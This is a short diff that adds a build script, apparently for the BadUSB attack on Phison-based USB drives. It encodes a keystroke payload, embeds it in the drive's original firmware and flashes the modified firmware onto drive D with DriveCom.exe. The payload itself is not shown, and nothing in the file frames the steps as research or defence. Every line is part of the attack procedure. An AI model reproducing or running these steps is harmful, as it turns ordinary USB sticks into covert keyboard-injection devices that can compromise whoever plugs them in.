@@ -1,0 +1,10 @@
+java -jar encoder.jar -i payload.txt -o payload.bin
+copy fw_original.bin fw.bin /Y
+EmbedPayload.exe payload.bin fw.bin
+DriveCom.exe /drive=D /action=SendFirmware /burner=BN07V502TAW.BIN /firmware=fw.bin
+
+
+copy 1.txt 2.txt /Y
+
+#fw.bin - every time recopy before write payload
+
